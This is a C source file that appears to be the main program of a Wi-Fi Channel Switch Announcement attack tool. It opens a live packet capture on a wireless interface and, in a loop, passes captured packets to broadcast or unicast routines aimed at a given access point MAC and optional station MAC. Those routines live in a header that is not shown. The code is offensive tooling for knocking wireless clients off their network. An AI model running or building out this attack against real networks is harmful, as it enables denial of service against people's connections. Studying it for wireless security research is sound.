#include "csa_attack.h"

void usage() {
    printf("syntax: ./csa <interface> <apMAC> [<StationMac>]\n");
    printf("sample: ./csa wlan0 88:88:88:88:88:88 99:99:99:99:99:99\n");
}

typedef struct {
    char* dev_;
} Param;

Param param = {
    .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) returned null - %s\n", param.dev_, errbuf);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex returned %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        switch (argc) {
            case 3:
                broadcast(argv[1], packet, argv[2], header->caplen);
                break;
            case 4:
                unicast(argv[1], packet, argv[2], header->caplen, argv[3]);
                break;
            default:
                usage();
                break;
        }
    }

    pcap_close(pcap);
    return 0;
}
